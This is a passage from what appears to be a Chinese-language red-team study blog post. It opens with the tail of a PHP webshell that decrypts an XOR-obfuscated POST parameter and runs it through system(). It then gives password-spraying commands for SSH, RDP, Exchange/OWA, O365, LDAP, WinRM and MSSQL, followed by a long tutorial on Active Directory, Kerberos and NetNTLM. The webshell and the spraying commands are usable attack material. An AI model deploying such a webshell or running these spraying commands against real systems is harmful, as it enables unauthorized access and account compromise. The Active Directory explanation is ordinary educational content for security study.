$&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num2&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 序列化数据</span><br><span class="line">        $serializedData = serializeData($k, $B);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 密钥可以是任意字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 使用 XOR 加密序列化后的数据</span><br><span class="line">        $encryptedData = xorEncrypt($serializedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        return $encryptedData;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密和反序列化</span><br><span class="line">function decryptAndUnserialize($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    // 解密数据</span><br><span class="line">    $decryptedData = xorDecrypt($encryptedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 反序列化数据</span><br><span class="line">    $data = unserializeData($decryptedData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 示例：获取加密数据并解密</span><br><span class="line">function getdata()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        // 获取加密数据</span><br><span class="line">        $encryptedData = get_post();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 必须与加密时一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密并反序列化</span><br><span class="line">        $decryptedData = decryptAndUnserialize($encryptedData, $key);</span><br><span class="line">        echo $decryptedData[&quot;num1&quot;];</span><br><span class="line">        $message = &#x27;&#x27;;</span><br><span class="line">        system($decryptedData[&quot;num1&quot;], $message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 输出解密后的数据</span><br><span class="line">        print_r($message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getdata();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><h4 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10</span><br></pre></td></tr></table></figure>

<p>usernames-list.txt是你创建的用户名本</p>
<h4 id="RDP-远程桌面协议"><a href="#RDP-远程桌面协议" class="headerlink" title="RDP 远程桌面协议"></a>RDP 远程桌面协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026</span><br></pre></td></tr></table></figure>



<h4 id="MailSniper"><a href="#MailSniper" class="headerlink" title="MailSniper"></a>MailSniper</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/dafthack/MailSniper.git</span><br><span class="line">导入模块</span><br><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">如果遇到 执行策略 限制，可以先运行：</span><br><span class="line">Set-ExecutionPolicy Unrestricted -Scope Process</span><br><span class="line">OWA 密码喷洒</span><br><span class="line">Invoke-PasswordSprayOWA -UserList users.txt -Password Winter2024</span><br><span class="line">EWS 密码喷洒</span><br><span class="line">Invoke-PasswordSprayEWS -UserList users.txt -Password Password123</span><br><span class="line">枚举邮箱</span><br><span class="line">Invoke-GlobalMailSearch -Mailbox admin@example.com -SearchTerms &quot;password&quot;</span><br><span class="line">这会在 admin@example.com 邮箱中搜索包含 &quot;password&quot; 关键词的邮件</span><br></pre></td></tr></table></figure>

<h4 id="SprayingToolkit"><a href="#SprayingToolkit" class="headerlink" title="SprayingToolkit"></a>SprayingToolkit</h4><h5 id="🔹-下载-SprayingToolkit"><a href="#🔹-下载-SprayingToolkit" class="headerlink" title="🔹 下载 SprayingToolkit"></a><strong>🔹 下载 SprayingToolkit</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/byt3bl33d3r/SprayingToolkit.git</span><br><span class="line">cd SprayingToolkit</span><br></pre></td></tr></table></figure>

<h5 id="🔹-安装依赖"><a href="#🔹-安装依赖" class="headerlink" title="🔹 安装依赖"></a><strong>🔹 安装依赖</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>如果 <code>pip</code> 安装失败，尝试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --break-system-packages -r requirements.txt</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="🚀-2-SprayingToolkit-使用示例"><a href="#🚀-2-SprayingToolkit-使用示例" class="headerlink" title="🚀 2. SprayingToolkit 使用示例"></a><strong>🚀 2. SprayingToolkit 使用示例</strong></h5><p>SprayingToolkit 主要由多个脚本组成，如 <code>owaSpray.py</code>、<code>o365Spray.py</code>、<code>smtpSpray.py</code> 等。</p>
<hr>
<h5 id="🔹-OWA（Outlook-Web-Access）密码喷洒"><a href="#🔹-OWA（Outlook-Web-Access）密码喷洒" class="headerlink" title="🔹 OWA（Outlook Web Access）密码喷洒"></a><strong>🔹 OWA（Outlook Web Access）密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python owaSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure>

<p>📌 <strong>参数解析：</strong></p>
<ul>
<li><code>-u users.txt</code>：包含用户名的文件</li>
<li><code>-p Winter2024</code>：尝试的密码</li>
<li><code>-d example.com</code>：目标域名</li>
</ul>
<hr>
<h5 id="🔹-O365（Office-365）密码喷洒"><a href="#🔹-O365（Office-365）密码喷洒" class="headerlink" title="🔹 O365（Office 365）密码喷洒"></a><strong>🔹 O365（Office 365）密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python o365Spray.py -u users.txt -p Winter2024 --validate</span><br></pre></td></tr></table></figure>

<p>📌 这个命令会：</p>
<ul>
<li>检测 O365 账户是否存在</li>
<li>进行密码喷洒</li>
</ul>
<hr>
<h5 id="🔹-LDAP-密码喷洒"><a href="#🔹-LDAP-密码喷洒" class="headerlink" title="🔹 LDAP 密码喷洒"></a><strong>🔹 LDAP 密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ldapSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure>

<p>📌 适用于 <strong>Active Directory</strong> 认证的环境。</p>
<hr>
<h5 id="🔹-WinRM-密码喷洒"><a href="#🔹-WinRM-密码喷洒" class="headerlink" title="🔹 WinRM 密码喷洒"></a><strong>🔹 WinRM 密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python winrmSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure>

<p>📌 适用于 <strong>Windows 远程管理（WinRM）</strong> 认证测试。</p>
<hr>
<h5 id="🔹-MSSQL（Microsoft-SQL-Server）密码喷洒"><a href="#🔹-MSSQL（Microsoft-SQL-Server）密码喷洒" class="headerlink" title="🔹 MSSQL（Microsoft SQL Server）密码喷洒"></a><strong>🔹 MSSQL（Microsoft SQL Server）密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python mssqlSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure>

<p>📌 用于尝试暴力破解 <strong>SQL Server 账户</strong>。</p>
<h2 id="Phishing-网络钓鱼"><a href="#Phishing-网络钓鱼" class="headerlink" title="Phishing 网络钓鱼"></a>Phishing 网络钓鱼</h2><h2 id="Active-Directory-基础知识"><a href="#Active-Directory-基础知识" class="headerlink" title="Active Directory 基础知识"></a>Active Directory 基础知识</h2><h3 id="Windows-域"><a href="#Windows-域" class="headerlink" title="Windows 域"></a>Windows 域</h3><p>想象一下，您管理着一个只有五台计算机和五名员工的小型企业网络。在这样一个小型网络中，您可能能够毫无问题地单独配置每台计算机。您将手动登录每台计算机，为使用它们的任何人创建用户，并为每个员工的帐户进行特定配置。如果用户的计算机停止工作，您可能会去他们那里并现场修理计算机。</p>
<p>虽然这听起来是一种非常轻松的生活方式，但假设您的业务突然发展壮大，现在拥有 157 台计算机和 320 个不同的用户，分布在四个不同的办公室。您是否仍然能够将每台计算机作为单独的实体进行管理，为网络中的每个用户手动配置策略，并为每个人提供现场支持？答案很可能是否定的。</p>
<p>为了克服这些限制，我们可以使用 Windows 域。简而言之，<strong>Windows 域</strong>是受特定企业管理的一组用户和计算机。域背后的主要思想是将 Windows 计算机网络的通用组件的管理集中在一个名为<strong>Active Directory ( AD )<strong>的存储库中。运行 Active Directory 服务的服务器称为</strong>域控制器 ( DC )</strong>。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/bebe5dfec0208bf563d01fa2dd1fb7a7-17435053133542.png" alt="Windows 域概述"></p>
<p>配置 Windows 域的主要优点是：</p>
<ul>
<li>**集中身份管理：**可以轻松从 Active Directory 配置整个网络中的所有用户。</li>
<li>**管理安全策略：**您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。</li>
</ul>
<p>真实案例</p>
<p>如果这听起来有点令人困惑，那么很可能您已经在学校、大学或工作中的某个时候与 Windows 域进行过交互。</p>
<p>在学校&#x2F;大学网络中，通常会为您提供一个用户名和密码，您可以在校园内的任何计算机上使用它们。您的凭据对所有计算机都有效，因为每当您在计算机上输入它们时，它都会将身份验证过程转发回 Active Directory，在那里将检查您的凭据。借助 Active Directory，您的凭据不需要存在于每台计算机上，并且可以在整个网络中使用。</p>
<p>Active Directory 也是允许您的学校&#x2F;大学限制您访问学校&#x2F;大学机器上的控制面板的组件。策略通常会部署在整个网络中，这样您就不具备这些计算机的管理权限。</p>
<h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h3><p>Windows 域的核心是 <strong>Active Directory 域服务（AD DS）</strong>。该服务充当目录，存储着网络中所有“对象”的信息。在 AD 支持的众多对象中，包含 <strong>用户、组、计算机、打印机、共享资源</strong> 等。让我们来看看其中的一些关键对象：</p>
<hr>
<h4 id="用户（Users）"><a href="#用户（Users）" class="headerlink" title="用户（Users）"></a><strong>用户（Users）</strong></h4><p>用户是 Active Directory 中最常见的对象类型之一。用户属于<strong>安全主体（Security Principals）</strong>，这意味着他们可以通过域进行身份验证，并可被授予访问文件、打印机等资源的权限。可以这样理解：安全主体是能够在网络资源上执行操作的对象。</p>
<p>用户对象可以用于表示两种实体：</p>
<ul>
<li><strong>人员（People）：</strong> 通常代表组织中的人员，如员工，他们需要访问网络资源。</li>
<li><strong>服务（Services）：</strong> 也可以定义用于特定服务（如 <strong>IIS</strong> 或 <strong>MSSQL</strong>）的用户。所有服务都需要用户账户来运行，但服务用户与普通用户不同，它们仅具有运行特定服务所需的权限。</li>
</ul>
<hr>
<h4 id="计算机（Machines）"><a href="#计算机（Machines）" class="headerlink" title="计算机（Machines）"></a><strong>计算机（Machines）</strong></h4><p>计算机是 Active Directory 中的另一类对象。每当一台计算机加入 Active Directory 域，都会创建一个对应的<strong>计算机对象（Machine Object）</strong>。计算机同样属于<strong>安全主体（Security Principals）</strong>，并被分配一个账户，与普通用户账户类似，不过其权限相对受限。</p>
<p><strong>计算机账户</strong> 本身在分配的计算机上具有本地管理员权限。通常情况下，计算机账户不应被直接访问，除非是该计算机本身使用。但与任何账户一样，如果掌握了计算机账户的密码，就可以利用它进行登录。</p>
<blockquote>
<p><strong>注意：</strong> 计算机账户的密码是<strong>自动轮换</strong>的，通常由 <strong>120 个随机字符</strong> 组成。</p>
</blockquote>
<p>识别计算机账户相对简单，它们遵循特定的命名规则：计算机账户的名称是计算机名后面加上 <strong><code>$</code></strong> 符号。例如，名为 <strong>DC01</strong> 的计算机，其计算机账户名称为 <strong>DC01$</strong>。</p>
<hr>
<h4 id="安全组（Security-Groups）"><a href="#安全组（Security-Groups）" class="headerlink" title="安全组（Security Groups）"></a><strong>安全组（Security Groups）</strong></h4><p>如果你熟悉 Windows，你可能知道可以创建<strong>用户组</strong>，以便为整个组分配文件或其他资源的访问权限，而不是单独为每个用户授予权限。这样可以更方便地管理权限：只需将用户添加到现有组，他们就会自动继承该组的所有权限。</p>
<p><strong>安全组</strong> 也属于<strong>安全主体（Security Principals）</strong>，因此，它们可以被授予网络资源的权限。</p>
<p><strong>组的成员</strong> 可以是<strong>用户</strong>，也可以是<strong>计算机</strong>，甚至可以包含其他<strong>组</strong>。</p>
<p>在域中，默认会创建多个组，用于授予特定权限。例如，以下是域中的一些重要安全组：</p>
<table>
<thead>
<tr>
<th><strong>安全组</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Domain Admins</strong></td>
<td>该组的用户拥有整个域的管理权限，默认情况下，他们可以管理域内的任何计算机，包括域控制器（DCs）。</td>
</tr>
<tr>
<td><strong>Server Operators</strong></td>
<td>该组的用户可以管理 <strong>域控制器（DCs）</strong>，但不能更改任何管理员组的成员身份。</td>
</tr>
<tr>
<td><strong>Backup Operators</strong></td>
<td>该组的用户可以访问任何文件，无视权限限制。此组用于执行计算机数据的备份操作。</td>
</tr>
<tr>
<td><strong>Account Operators</strong></td>
<td>该组的用户可以在域中创建或修改其他账户。</td>
</tr>
<tr>
<td><strong>Domain Users</strong></td>
<td>包含域内所有用户账户。</td>
</tr>
<tr>
<td><strong>Domain Computers</strong></td>
<td>包含域内所有计算机账户。</td>
</tr>
<tr>
<td><strong>Domain Controllers</strong></td>
<td>包含域内所有 <strong>域控制器（DCs）</strong>。</td>
</tr>
</tbody></table>
<p>你可以在 <strong>Microsoft 官方文档</strong> 中获取完整的默认安全组列表。</p>
<hr>
<h4 id="Active-Directory-用户和计算机（ADUC）"><a href="#Active-Directory-用户和计算机（ADUC）" class="headerlink" title="Active Directory 用户和计算机（ADUC）"></a><strong>Active Directory 用户和计算机（ADUC）</strong></h4><p>要在 Active Directory 中配置 <strong>用户、组或计算机</strong>，需要登录到 <strong>域控制器（Domain Controller）</strong>，然后在 <strong>开始菜单</strong> 中运行：</p>
<p><strong>“Active Directory Users and Computers”（ADUC）</strong></p>
<h4 id="安全组与-OU"><a href="#安全组与-OU" class="headerlink" title="安全组与 OU"></a>安全组与 OU</h4><p>OUs 是一种<strong>容器对象</strong>，用于对用户和计算机进行分类。</p>
<p>您可能想知道为什么我们同时拥有组和 OU。虽然两者都用于对用户和计算机进行分类，但它们的用途完全不同：</p>
<ul>
<li><strong>OU</strong>可以方便地 <strong>将策略应用于</strong>用户和计算机，其中包括根据用户在企业中的特定角色而适用于用户组的特定配置。请记住，用户一次只能成为一个OU的成员，因为尝试将两组不同的策略应用于单个用户是没有意义的。</li>
<li>另一方面，<strong>安全组用于****授予对资源的权限</strong>。例如，如果您想允许某些用户访问共享文件夹或网络打印机，则可以使用组。用户可以是多个组的一部分，这是授予对多个资源的访问权限所必需的。</li>
</ul>
<p>默认情况下，所有加入域的机器（DC 除外）都将放入名为“Computers”的容器中。如果我们检查DC，我们会看到一些设备已经在那里：</p>
<p>DC:</p>
<p>域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p>
<p>到目前为止，我们只是出于方便的目的将用户和计算机组织在 OU 中，但其背后的主要思想是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向他们推送不同的配置和安全基准。</p>
<p>Windows 通过<strong>组策略对象 ( GPO )</strong> 管理此类策略。GPO 只是可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定机器和身份设置基线。</p>
<p>要配置 GPO，您可以使用开始菜单中的<strong>组策略管理</strong>工具：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/b19052c41e27fbbb2651038cede63e11.png" alt="Start menu GPM"></p>
<p>打开它时，您首先会看到完整的 OU 层次结构，如前所述。要配置组策略，首先在<strong>组策略对象</strong>下创建一个 GPO ，然后将其链接到要应用策略的 OU 。例如，您可以看到您的计算机中已经存在一些 GPO：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/06d5e70fbfa648f73e4598e18c8e9527.png" alt="OU scope"></p>
<p>GPO 通过名为 <code>SYSVOL</code> 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向我们网络中每个 DC 上的 <code>C:\Windows\SYSVOL\sysvol\</code> 目录。</p>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/winadbasics">https://tryhackme.com/room/winadbasics</a></p>
<h3 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h3><p>在 Windows 域环境中，所有凭据都存储在 <strong>域控制器（Domain Controllers，DC）</strong> 中。每当用户尝试使用域凭据认证某项服务时，该服务需要向 <strong>域控制器</strong> 发送请求，以验证凭据是否正确。在 Windows 域中，网络身份验证可以使用以下两种协议：</p>
<ul>
<li><strong>Kerberos</strong>：适用于所有较新的 Windows 版本，是现代 Windows 域的默认身份验证协议。</li>
<li><strong>NetNTLM</strong>：一种旧版身份验证协议，主要用于兼容性目的。</li>
</ul>
<p>尽管 <strong>NetNTLM</strong> 已被认为<strong>过时</strong>，但大多数网络仍然<strong>同时支持这两种协议</strong>。接下来，我们将深入了解这两种协议的工作原理。</p>
<hr>
<h4 id="Kerberos-身份验证"><a href="#Kerberos-身份验证" class="headerlink" title="Kerberos 身份验证"></a><strong>Kerberos 身份验证</strong></h4><p><strong>Kerberos</strong> 是 <strong>现代 Windows 版本</strong> 的默认身份验证协议。用户通过 <strong>Kerberos</strong> 登录服务时，将会被分配 <strong>票据（Tickets）</strong>。可以将<strong>票据</strong>理解为<strong>已成功身份验证的证明</strong>——拥有有效票据的用户可以向服务出示该票据，以表明其已通过身份验证，从而获得访问权限。</p>
<p>当使用 <strong>Kerberos</strong> 进行身份验证时，系统会执行以下流程：</p>
<ol>
<li><strong>用户发送身份验证请求</strong><ul>
<li>用户向 <strong>密钥分发中心（Key Distribution Center, KDC）</strong> 发送请求，其中包含<strong>用户名</strong>和<strong>时间戳</strong>，并使用<strong>由其密码派生的密钥进行加密</strong>。</li>
<li><strong>KDC</strong> 是 Kerberos 票据的管理服务，通常安装在**域控制器（DC）**上，负责创建和分发 Kerberos 票据。</li>
</ul>
</li>
<li><strong>KDC 生成并返回票据授予票据（TGT）</strong><ul>
<li><strong>KDC</strong> 生成 <strong>票据授予票据（Ticket Granting Ticket, TGT）</strong>，并返回给用户。</li>
<li><strong>TGT 的作用</strong>：允许用户<strong>请求访问特定服务的额外票据</strong>，从而避免用户每次访问服务时都必须重新输入凭据。</li>
</ul>
</li>
<li><strong>TGT 的加密与存储机制</strong><ul>
<li><strong>TGT 由 KDC 使用 krbtgt 账户的密码哈希加密</strong>，因此用户<strong>无法直接访问其内容</strong>。</li>
<li><strong>TGT 的重要性</strong>：TGT <strong>内部包含会话密钥（Session Key）</strong> 的副本，且 <strong>KDC 本身不会存储会话密钥</strong>，而是<strong>通过解密 TGT 来恢复</strong>会话密钥（如果需要）。</li>
</ul>
</li>
</ol>
<p><img src="/../imgs/$%7Bfiilename%7D/d36f5a024c20fb480cdae8cd09ddc09f.png" alt="Kerberos step 1"></p>
<ol>
<li><p>当用户希望连接到网络上的某项服务（如共享资源、网站或数据库）时，他们会使用 <strong>TGT（票据授予票据）</strong> 向 <strong>KDC（密钥分发中心）</strong> 请求 <strong>TGS（服务票据，Ticket Granting Service）</strong>。TGS 是一种 <strong>专门针对特定服务</strong> 的票据，仅允许访问该票据所指定的服务。</p>
<p>为了请求 <strong>TGS</strong>，用户会发送以下信息：</p>
<ul>
<li><strong>用户名和时间戳</strong>（使用 <strong>会话密钥（Session Key）</strong> 加密）。</li>
<li><strong>TGT（票据授予票据）</strong>。</li>
<li><strong>SPN（服务主体名称，Service Principal Name）</strong>，用于指定<strong>希望访问的服务及其服务器</strong>。</li>
</ul>
<p><strong>KDC 处理请求后，将返回</strong>：</p>
<ol>
<li><strong>TGS（服务票据）</strong>：允许用户访问指定服务的票据。</li>
<li><strong>服务会话密钥（Service Session Key）</strong>：用于与目标服务进行身份验证。</li>
</ol>
<p><strong>TGS 的加密机制</strong>：</p>
<ul>
<li><strong>TGS 由 KDC 使用“服务所有者”（Service Owner）的哈希密钥加密</strong>。</li>
<li><strong>服务所有者</strong> 指运行该服务的 <strong>用户或计算机账户</strong>。</li>
<li><strong>TGS 内部包含“服务会话密钥”的副本</strong>，目标服务可以通过解密 <strong>TGS</strong> 获取该密钥，以完成身份验证。</li>
</ul>
</li>
</ol>
<p><img src="/../imgs/$%7Bfiilename%7D/84504666e78373c613d3e05d176282dc.png" alt="Kerberos step 2"></p>
<p>然后，<strong>TGS（服务票据）</strong> 可以被发送到目标服务，以进行身份验证并建立连接。服务将使用其配置账户的 <strong>密码哈希</strong> 来解密 <strong>TGS</strong>，并验证 <strong>服务会话密钥（Service Session Key）</strong> 的有效性。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/8fbf08d03459c1b792f3b6efa4d7f285.png" alt="Kerberos step 3"></p>
<h4 id="NetNTLM-身份验证"><a href="#NetNTLM-身份验证" class="headerlink" title="NetNTLM 身份验证"></a>NetNTLM 身份验证</h4><p>NetNTLM 采用质询-响应机制。整个过程如下：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/2eab5cacbd0d3e9dc9afb86169b711ec.png" alt="NetNTLM authentication"></p>
<p>客户端向他们希望访问的服务器发送身份验证请求。<br> 服务器生成一个随机数，并将其作为挑战发送给客户端。<br> 客户端将其 <strong>NTLM 密码哈希</strong> 与该挑战（以及其他已知数据）结合，生成对挑战的响应，并将其发送回服务器进行验证。<br> 服务器将挑战和响应转发到 <strong>域控制器</strong> 进行验证。<br> 域控制器使用该挑战重新计算响应，并与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问被拒绝。验证结果将返回给服务器。<br> 服务器将身份验证结果转发给客户端。</p>
<p>请注意，为了安全起见，用户的 <strong>密码（或哈希）</strong> 永远不会通过网络传输。</p>
<p><strong>注意</strong>：上述过程适用于使用 <strong>域账户</strong> 的情况。如果使用的是 <strong>本地账户</strong>，服务器可以自行验证对挑战的响应，而无需与域控制器交互，因为它在 <strong>SAM（安全账户管理器）</strong> 中本地存储了密码哈希。</p>
<h3 id="树、森林和信任关系"><a href="#树、森林和信任关系" class="headerlink" title="树、森林和信任关系"></a>树、森林和信任关系</h3><p>到目前为止，我们讨论了如何管理单一域、域控制器的角色以及它如何将计算机、服务器和用户加入域中。</p>
<h4 id="单一域"><a href="#单一域" class="headerlink" title="单一域"></a>单一域</h4><p>随着公司发展，网络也会逐渐扩展。对于一个公司来说，开始时使用单一域是足够的，但随着时间推移，一些额外的需求可能会推动你拥有多个域。</p>
<h4 id="树（Trees）"><a href="#树（Trees）" class="headerlink" title="树（Trees）"></a>树（Trees）</h4><p>例如，假设你的公司突然扩展到一个新国家。这个新国家有不同的法律和规定，要求你更新 GPO（组策略对象）以符合法规。此外，你现在有了两个国家的 IT 团队，每个 IT 团队需要管理与各自国家相关的资源，而不互相干扰。虽然你可以创建复杂的 OU（组织单位）结构并使用委托来实现这一点，但拥有一个庞大的 AD 结构可能很难管理，并且容易出错。</p>
<p>幸运的是，Active Directory 支持集成多个域，使你可以将网络划分为可以独立管理的单元。如果你有两个共享相同命名空间（例如 thm.local）的域，那么这些域可以合并成一个树结构。</p>
<p>假设我们的 thm.local 域被划分为两个子域，分别是英国（UK）和美国（US）分支，那么你可以构建一个树，根域是 thm.local，两个子域分别为 uk.thm.local 和 us.thm.local，每个子域都有自己的 AD、计算机和用户：</p>
<h4 id="树结构"><a href="#树结构" class="headerlink" title="树结构"></a>树结构</h4><p>这种分区结构使我们能更好地控制谁可以访问域中的哪些资源。来自英国的 IT 团队将拥有自己的 DC（域控制器），只管理英国的资源。例如，英国用户无法管理美国用户。通过这种方式，每个分支的域管理员将完全控制各自的 DC，但不能控制其他分支的 DC。每个域也可以独立配置策略。</p>
<p>在讨论树和森林时，需要引入一个新的安全组。<strong>企业管理员组（Enterprise Admins）</strong> 将授予用户对整个企业所有域的管理员权限。每个域仍然拥有自己的 <strong>域管理员（Domain Admins）</strong>，他们具有对各自单一域的管理员权限，而 <strong>企业管理员</strong> 则可以控制企业中的一切。</p>
<h3 id="森林（Forests）"><a href="#森林（Forests）" class="headerlink" title="森林（Forests）"></a>森林（Forests）</h3><p>你管理的域也可以配置在不同的命名空间中。假设公司继续发展，并最终收购了另一家公司 MHT Inc. 当两家公司合并时，你可能会有不同的域树，每个域树由各自的 IT 部门管理。多个具有不同命名空间的域树合并到同一个网络中，这被称为 <strong>森林</strong>。</p>
<h4 id="信任关系（Trust-Relationships）"><a href="#信任关系（Trust-Relationships）" class="headerlink" title="信任关系（Trust Relationships）"></a>信任关系（Trust Relationships）</h4><p>在树和森林中组织多个域后，你可以获得更好的管理和资源的隔离网络。但某些时候，位于 <strong>THM UK</strong> 的用户可能需要访问 <strong>MHT ASIA</strong> 服务器上的共享文件。为了实现这一点，树和森林中的域之间通过信任关系相互连接。</p>
<p>简单来说，域之间的信任关系使得 <strong>THM UK</strong> 域的用户能够访问 <strong>MHT EU</strong> 域的资源。</p>
<p>最简单的信任关系是单向信任。在单向信任关系中，如果 <strong>域 AAA</strong> 信任 <strong>域 BBB</strong>，这意味着 <strong>域 BBB</strong> 中的用户可以被授权访问 <strong>域 AAA</strong> 中的资源：</p>
<h4 id="信任关系"><a href="#信任关系" class="headerlink" title="信任关系"></a>信任关系</h4><p>单向信任关系的方向与访问方向相反。</p>
<p>也可以建立双向信任关系，使得两个域都可以互相授权对方域的用户。默认情况下，将多个域加入同一个树或森林时，会形成双向信任关系。</p>
<p>需要注意的是，域之间建立信任关系并不会自动授予对其他域所有资源的访问权限。一旦建立了信任关系，你可以授权不同域的用户访问资源，但实际授权哪些资源是由你决定的。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/">http://example.com/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/20/win%E6%8F%90%E6%9D%83/" title="win提权"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">win提权</div></div><div class="info-2"><div class="info-item-1">win的提权从通常的位置收集密码远程连接纯命令行 xfreerdp xfreerdp /v:&lt;远程IP&gt; /u:&lt;用户名&gt; /p:&lt;密码&gt;  界面 remmina Powershell历史每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命令行中直接运行包含密码的命令，则稍后可以从 cmd.exe提示符中使用以下命令检索该密码： type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt%userprofile%这是 Windows 的环境变量，表示当前用户的主目录（Home 目录）。如果要在powershell执行命令我们要把%userprofile%换为$Env：userprofile   保存的 Windows 凭据Windows...</div></div></div></a><a class="pagination-related" href="/2025/05/29/box/" title="box"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">box</div></div><div class="info-2"><div class="info-item-1">ysper牌靶机自制靶机 - Ysper_1 爆破邮箱密码   爆破后在里面找到第一个flag  然后利用爆出的密码1q2w3e4r 去进行smb faker访问 下载源码smb: \&gt; recurse ONsmb: \&gt; prompt OFFsmb: \&gt; mget *  源码中找到   拿到shell 数据库中有flag 数据库密码为root在源码config文件中也可找到 sudo -l发现faker权限的pocsuite 提权到faker cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/e.pyfrom pocsuite3.api import Output, POCBase, register_pocimport osclass POC(POCBase):    vulID = &quot;faker-001&quot;  # 随便写一个ID    version = &quot;1.0&quot;    author = &quot;chatgpt&quot;    vulDate =...</div></div></div></a></nav></div><div 